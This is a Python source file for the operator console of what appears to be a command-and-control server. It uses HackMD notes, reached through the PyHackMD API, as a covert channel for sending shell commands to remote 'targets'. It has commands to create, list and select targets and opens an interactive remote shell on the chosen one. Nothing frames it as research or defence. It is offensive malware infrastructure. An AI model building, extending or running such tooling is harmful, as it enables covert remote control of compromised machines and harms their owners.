import dotenv
import os
from lib.command import CommandManager
from lib.notes import NoteManager
from lib import Target
from PyHackMD import API
import signal

dotenv.load_dotenv('.dotenv')

api = API(os.getenv("API_KEY"))


class HackmdC2Server:
    note_manager = NoteManager(api)
    command_manager = CommandManager(api, "")
    target: Target | None = None
    in_shell = False

    def sigint_handler(self):
        if self.in_shell:
            self.command_manager.sigint_handler()
            print("\n$ ")

    def set_target(self, target: Target):
        self.target = target
        self.command_manager = CommandManager(api, target.note_id)

    def shell(self):
        self.in_shell = True
        self.command_manager.reset_terminal()
        while True:
            cmd = input('$ ')
            args = cmd.split(' ')
            match args[0]:
                case 'current':
                    print(f"Current target: {self.target.name}")
                case 'exit':
                    print("Exiting shell...")
                    break
                case _:
                    self.command_manager.execute_command(cmd)

        self.in_shell = False

    def main(self):
        print("Welcome to Hackmd C2 Server")
        self.note_manager.list_targets()

        while True:
            cmd = input('\n> ')
            args = cmd.split(' ')
            match args[0]:
                case 'shell':
                    if self.target is None:
                        print("No target selected.")
                        continue
                    self.shell()
                case 'use':
                    if len(args) < 2:
                        print("Usage: use <target>")
                        continue
                    self.set_target(self.note_manager.targets.get(args[1]))
                    print(f"Target set to {args[1]}")
                case 'list-targets':
                    self.note_manager.list_targets()
                case 'create-target':
                    if len(args) < 2:
                        print("Usage: create-target <target_name>")
                        continue
                    self.note_manager.add_target(args[1])
                    print(f"Target {args[1]} created.")
                case 'help':
                    print(
                        "Available commands: shell, use, list-targets, create-target, help, exit")
                case 'exit':
                    print("Exiting...")
                    break
                case _:
                    print("Unknown command")


server = HackmdC2Server()


def handle_sigint(signum, frame):
    global server
    server.sigint_handler()


signal.signal(signal.SIGINT, handle_sigint)

if __name__ == "__main__":
    server.main()
